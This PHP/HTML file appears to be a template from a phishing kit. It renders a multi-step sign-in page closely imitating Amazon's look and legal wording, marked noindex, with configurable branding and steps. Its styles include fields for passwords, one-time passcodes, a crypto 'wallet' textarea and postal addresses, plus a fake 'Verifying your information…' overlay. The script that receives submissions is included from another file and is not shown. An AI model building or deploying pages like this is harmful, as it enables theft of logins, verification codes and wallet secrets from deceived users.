<?php
// Retail template — Amazon style: white, narrow 350px, thin border, orange accent, "Sign-In" heading
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> Sign-In</title>
<meta name="robots" content="noindex,nofollow">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Amazon Ember',Arial,sans-serif;min-height:100vh;min-height:100dvh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding:16px 16px 40px;color:#0f1111}

/* Amazon-style centered logo at top */
.site-logo{text-align:center;margin-bottom:20px;margin-top:8px}
.site-logo-box{display:inline-flex;align-items:center;justify-content:center;width:auto}
.site-logo-box img{max-width:120px;max-height:40px;object-fit:contain}
.site-logo-text{font-size:28px;font-weight:900;color:<?=$accent?>;letter-spacing:-1px}

.card{width:100%;max-width:350px;background:#fff;border:1px solid #d5d9d9;border-radius:8px;padding:20px 22px;box-shadow:none}

.sign-in-title{font-size:28px;font-weight:400;color:#0f1111;margin-bottom:16px;line-height:1.2}
.field{margin-bottom:10px}
.field label{display:block;font-size:13px;font-weight:700;color:#0f1111;margin-bottom:3px}
.field input{width:100%;background:#fff;border:1px solid #888c8c;color:#0f1111;padding:7px 10px;border-radius:3px;font-size:13px;outline:none;transition:border-color .15s,box-shadow .15s;font-family:inherit;-webkit-appearance:none;height:31px}
.field input:focus{border-color:#e8a723;box-shadow:0 0 0 3px rgba(232,167,35,.35)}
.field input::placeholder{color:#d5d9d9}
.or-div{text-align:center;font-size:12px;color:#767676;margin:8px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:#e3e6e6}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.btn{width:100%;padding:8px 10px;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);color:#111;font-size:13px;font-weight:400;border:1px solid #a88734;border-radius:3px;cursor:pointer;margin-top:8px;transition:filter .15s;position:relative;font-family:inherit;box-shadow:0 1px 0 rgba(255,255,255,.4) inset}
.btn:hover{background:linear-gradient(to bottom,#f5d78e,#eeb933)}
.btn:active{background:linear-gradient(to bottom,#eeb933,#f5d78e)}
.btn:disabled{opacity:.7;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:12px;top:50%;width:14px;height:14px;border:2px solid rgba(0,0,0,.2);border-top-color:#333;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#c40000;margin-top:8px;display:none}

/* Amazon "By continuing" legal text */
.legal{font-size:12px;color:#555;margin-top:12px;line-height:1.5}
.legal a{color:#0066c0;text-decoration:none}
.legal a:hover{text-decoration:underline;color:#c45500}

/* Step sub */
.step-sub{font-size:13px;color:#555;margin-bottom:12px;line-height:1.4;display:none}

/* Divider between card sections */
.section-divider{border-top:1px solid #e3e6e6;margin:14px -22px;padding:0}

/* Bottom "New to [org]?" section */
.new-account{text-align:center;margin-top:14px}
.new-account-divider{display:flex;align-items:center;gap:8px;font-size:12px;color:#767676;margin-bottom:12px}
.new-account-divider::before,.new-account-divider::after{content:'';flex:1;height:1px;background:#e3e6e6}
.create-btn{display:block;width:100%;padding:8px 10px;background:linear-gradient(to bottom,#f5f6f6,#e9e9e9);color:#0f1111;font-size:13px;border:1px solid #d5d9d9;border-radius:3px;cursor:pointer;font-family:inherit}
.create-btn:hover{background:linear-gradient(to bottom,#e9e9e9,#d9d9d9)}

/* Wallet + otp + addr */
.wallet-area{width:100%;min-height:70px;background:#fff;border:1px solid #888c8c;color:#0f1111;padding:7px 10px;border-radius:3px;font-size:12px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:#e8a723}
.wallet-hint{font-size:11px;color:#767676;margin-top:4px;line-height:1.4}
.otp-wrap{display:flex;gap:6px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:18px;font-weight:700;padding:8px 2px;max-width:40px;background:#fff;border:1px solid #888c8c;border-radius:3px;color:#0f1111;outline:none;height:40px}
.otp-wrap input:focus{border-color:#e8a723}
.otp-hint{font-size:12px;color:#767676;text-align:center;margin-top:6px}
.addr-area{width:100%;min-height:55px;background:#fff;border:1px solid #888c8c;color:#0f1111;padding:7px 10px;border-radius:3px;font-size:13px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:#e8a723}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.85);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:38px;height:38px;border:3px solid #e3e6e6;border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#555}

@media(max-width:480px){
  body{padding:0;align-items:flex-start}
  .site-logo{padding:16px 16px 0}
  .card{min-height:calc(100vh - 90px);min-height:calc(100dvh - 90px);border-left:none;border-right:none;border-radius:0;padding:16px 14px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying your information…</div></div>

<div class="site-logo">
  <?php if($logo_url):?>
  <div class="site-logo-box"><img src="<?=htmlspecialchars($logo_url)?>" alt="<?=htmlspecialchars($org_name)?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="site-logo-text" style="display:none"><?=htmlspecialchars($org_name)?></span></div>
  <?php else:?>
  <span class="site-logo-text"><?=htmlspecialchars($org_name)?></span>
  <?php endif;?>
</div>

<div class="card">
  <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
  <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
    <div class="sign-in-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
    <div class="step-sub" id="step<?=$sn?>sub" style="<?=$sn>1?'display:block':''?>"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
    <form onsubmit="submitStep(event,<?=$sn?>)">
      <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
      <div class="legal">By continuing, you agree to <?=htmlspecialchars($org_name)?>'s <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</div>
      <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
      <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
    </form>
  </div>
  <?php endfor; ?>

  <div class="section-divider"></div>
  <div class="new-account">
    <div class="new-account-divider">New to <?=htmlspecialchars($org_name)?>?</div>
    <button class="create-btn">Create your <?=htmlspecialchars($org_name)?> account</button>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
</body>
</html>
